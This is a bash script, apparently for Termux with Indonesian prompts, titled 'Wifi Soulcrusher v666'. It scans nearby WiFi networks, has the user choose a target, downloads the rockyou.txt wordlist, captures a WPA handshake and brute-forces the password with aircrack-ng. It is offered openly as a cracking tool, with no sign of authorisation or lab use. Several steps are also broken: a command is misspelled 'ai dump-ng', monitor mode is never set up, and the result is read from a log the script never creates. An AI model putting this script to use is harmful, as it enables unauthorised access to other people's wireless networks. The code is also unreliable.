#!/bin/bash

# ∆π Wifi Soulcrusher v666
# Author: ∆π
# Usage: Jalankan di Termux dengan akses root

# Cek root
if [ "$(whoami)" != "root" ]; then
    echo "∆π ERROR: Jalankan sebagai root!"
    exit 1
fi

# Dependencies
check_deps() {
    command -v aircrack-ng >/dev/null 2>&1 || { 
        echo "∆π Install aircrack-ng dulu: pkg install aircrack-ng"
        exit 1
    }
    command -v termux-setup-storage >/dev/null 2>&1 || {
        echo "∆π Ini harus dijalankan di Termux!"
        exit 1
    }
}

# Halaman 1: Scan WiFi
scan_wifi() {
    clear
    echo "∆π Scanning WiFi..."
    rm -f /sdcard/wifi_scan.txt
    timeout 30s ai dump-ng wlan0 > /sdcard/wifi_scan.txt
    
    # Parse hasil scan
    BSSIDS=($(awk '/BSSID/{flag=1; next} /Station/{flag=0} flag' /sdcard/wifi_scan.txt | 
               grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | awk '{print $1}'))
    ESSIDS=($(awk '/BSSID/{flag=1; next} /Station/{flag=0} flag' /sdcard/wifi_scan.txt | 
               grep -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | awk '{print $2}'))
    
    echo "∆π Daftar Jaringan:"
    for i in "${!BSSIDS[@]}"; do
        echo "[$i] ${ESSIDS[$i]} (${BSSIDS[$i]})"
    done
    
    read -p "∆π Pilih target [0-$((${#BSSIDS[@]}-1))]: " choice
    TARGET_BSSID=${BSSIDS[$choice]}
    TARGET_ESSID=${ESSIDS[$choice]}
}

# Halaman 2: Pilih Wordlist
select_wordlist() {
    clear
    echo "∆π Target: $TARGET_ESSID ($TARGET_BSSID)"
    echo "1. Gunakan wordlist rockyou.txt (default)"
    echo "2. Gunakan wordlist custom"
    read -p "∆π Pilihan [1/2]: " wl_choice
    
    if [ $wl_choice -eq 2 ]; then
        termux-setup-storage
        echo "∆π Masukkan path file wordlist (contoh: /sdcard/wordlist.txt)"
        read -p "∆π Path: " wordlist
    else
        if [ ! -f "/sdcard/rockyou.txt" ]; then
            echo "∆π Downloading rockyou.txt..."
            wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /sdcard/rockyou.txt
        fi
        wordlist="/sdcard/rockyou.txt"
    fi
}

# Bruteforce
start_attack() {
    clear
    echo "∆π Memulai serangan ke $TARGET_ESSID..."
    echo "∆π Tekan Ctrl+C untuk berhenti"
    
    # Capture handshake
    timeout 60s ai dump-ng --bssid $TARGET_BSSID -w /sdcard/handshake wlan0
    
    # Bruteforce
    aircrack-ng -a2 -b $TARGET_BSSID -w $wordlist /sdcard/handshake-01.cap
    
    # Tampilkan hasil
    if grep -q "KEY FOUND" /sdcard/aircrack.log; then
        echo "∆π Password ditemukan: $(grep 'KEY FOUND' /sdcard/aircrack.log | awk '{print $4}')"
    else
        echo "∆π Gagal menemukan password!"
    fi
}

# Main
check_deps
scan_wifi
select_wordlist
start_attack